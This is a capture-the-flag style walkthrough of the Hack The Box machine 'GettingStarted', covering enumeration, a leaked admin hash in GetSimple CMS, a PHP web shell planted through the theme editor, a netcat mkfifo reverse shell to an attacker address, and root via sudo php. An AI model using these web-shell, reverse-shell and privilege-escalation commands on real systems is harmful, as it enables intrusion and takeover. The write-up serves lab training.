---
description: Full attack path for the HTB machine GettingStarted.
---

# GettingStarted

Use this page to track the full attack path for `GettingStarted`.

### Target

* OS: `Linux`
* Difficulty: `Easy`
* IP: `10.129.42.249`
* CMS: `GetSimple 3.3.15`
* User: `mrb3n`

### Enumeration

#### Network enumeration

```bash
# Quick service scan
nmap -sV --open -oA initial_scan 10.129.42.249

# Full TCP scan
nmap -p- --open -oA full_scan 10.129.42.249

# Script scan on discovered ports
nmap -sC -p 22,80 -oA script_scan 10.129.42.249
```

**Findings**

* `22/tcp` runs SSH
* `80/tcp` runs Apache `2.4.41` on Ubuntu

#### Web footprinting

```bash
# Fingerprint the target
whatweb 10.129.42.249

# Read the root page
curl http://10.129.42.249
```

**Findings**

* The target uses GetSimple CMS
* The page reveals the hostname `gettingstarted.htb`

Add the hostname locally:

```bash
echo "10.129.42.249 gettingstarted.htb" >> /etc/hosts
```

#### Directory enumeration

```bash
# Brute force common directories
gobuster dir -u http://gettingstarted.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Findings**

* `/admin` exposes the admin login panel
* `/theme` has directory listing enabled
* `/data` exposes XML files

#### Credential hunting

```bash
# Read the exposed user file
curl http://gettingstarted.htb/data/users/admin.xml
```

**Findings**

```xml
<USR>admin</USR>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
```

* The username is `admin`
* The hash is SHA-1 for `admin`
* Login succeeds at `/admin` with `admin:admin`

### Foothold

#### Validate the CMS path

```bash
searchsploit getsimple 3.3
# Found: GetSimple CMS v3.3.16 - RCE, Arbitrary File Upload
```

#### Use the theme editor for code execution

1. Go to **Theme → Theme Editor**
2. Select the `Innovation` theme
3. Open `template.php`
4. Replace the content with a web shell

```php
<?php system($_GET['cmd']); ?>
```

Save the file, then test code execution through the home page:

```bash
curl "http://10.129.42.249/?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `IN_GS` check blocks direct access, so trigger the payload through the CMS home page.

#### Get a reverse shell

Replace the payload with:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR-IP> 9443 >/tmp/f"); ?>
```

Start a listener:

```bash
nc -lvnp 9443
```

Trigger the page:

```bash
curl "http://10.129.42.249/"
```

Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### User flag

```bash
cd /home/mrb3n
cat user.txt
```

### Privilege escalation

#### Check `sudo` rights

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/php
```

PHP can run as root without a password.

Use the standard GTFOBins pattern:

```bash
sudo php -r 'system("/bin/sh -i");'
```

Then read the root flag:

```bash
cat /root/root.txt
```

### Takeaways

* Exposed CMS data directories can leak usernames and password hashes
* Weak hashes still fall quickly when the password is simple
* Theme editors become remote code execution when admin access is exposed
* `IN_GS` blocks direct PHP access, so trigger the template through the main page
* Run `sudo -l` early after you get a shell
* `sudo php` gives direct root when PHP is allowed in sudoers
